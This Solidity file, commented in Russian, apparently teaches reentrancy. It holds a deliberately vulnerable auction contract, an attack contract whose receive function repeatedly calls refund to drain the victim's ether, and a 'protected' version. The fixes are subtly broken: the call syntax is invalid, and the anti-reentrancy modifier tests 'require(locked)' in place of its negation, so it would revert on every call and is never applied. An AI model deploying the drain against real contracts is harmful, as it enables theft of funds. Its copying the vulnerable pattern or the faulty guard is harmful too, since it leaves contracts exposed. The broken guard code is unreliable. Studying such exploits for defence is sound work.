// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Demo {
    mapping(address => uint) public bidders;

    function bid() external payable  {
        bidders[msg.sender] += msg.value;
    }

    function currentBalance()external view returns(uint) {
        return address(this).balance;
    }

    function refund() external{
        uint refundValue = bidders[msg.sender];
        if (refundValue > 0){
            //Тут делаем низкоуровневый запрос, отправляя на адресс refundValue.
            //Этим адрессом может быть смарт контракт с функцией ресив
            //Функция ресив в свою очередь вызывает снова рефанд, и до следующей строчки мы дойдем только когда деньги на контракте закончатся.
            (bool success,) = msg.sender.call({value: refundValue});
            require(success, 'smth go wrong');
            bidders[msg.sender] = 0;
        }
    }
}


contract ReentrancyAttack {
    Demo toBrakeContract;
    constructor(address _demo) {
        toBrakeContract = Demo(_demo);
    }

    function proxyBid() external payable{
       toBrakeContract.bid{value: msg.value}();
    }

    function attack() external {
        toBrakeContract.refund();
    }

    receive() external payable{
        if (toBrakeContract.currentBalance() >= 1 ether){
            toBrakeContract.refund();
        }
    }
}


contract DemoProtect {
    mapping(address => uint) public bidders;
    bool locked;

    function bid() external payable  {
        bidders[msg.sender] += msg.value;
    }

    function currentBalance()external view returns(uint) {
        return address(this).balance;
    }
    //Такой подход называется pull
    function refund() external{
        uint refundValue = bidders[msg.sender];
        //Вариант номер 1, просто поставить сброс значение раньше ( нужно позаботиться о доп безопастности на случай падения транзакции)
        bidders[msg.sender] = 0;
        if (refundValue > 0){
            (bool success,) = msg.sender.call({value: refundValue});
            require(success, 'smth go wrong');
        }
    }
    
    //Вариант 2, при таком подходе повторный вызов функции произойдет до locked = false, а значит мы отловим ошибку.
    //В блокчейне операции идут синхронно одна за другой, а по сему все будет гуд
    modifier reentrancyDef() {
        require(locked, 'no reentrancy');
        locked = true;
        _;
        locked = false;
    }
}